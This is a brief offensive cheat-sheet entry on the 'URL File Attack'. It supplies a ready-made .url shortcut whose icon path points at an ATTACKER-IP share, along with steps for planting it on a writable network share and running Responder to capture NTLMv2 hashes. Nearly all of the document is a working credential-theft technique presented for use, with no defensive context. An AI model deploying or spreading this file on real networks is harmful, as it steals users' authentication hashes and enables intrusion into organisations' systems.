# URL File Attack

## URL File Attack

*   If we have a user that has all kind of share access we can add this to one of the shares

    ```
    [InternetShortcut]
    URL=whatever
    WorkingDirectory=whatever
    IconFile=\\ATTACKER-IP\%USERNAME%.icon
    IconIndex=1
    ```
* We have to save it as `"@test.url"` or `"~test.url"`
* We launch responder in our attacking machine `responder -I eth0 -v`
* We get NTLMv2 hashes

### URL File Attack - Resources
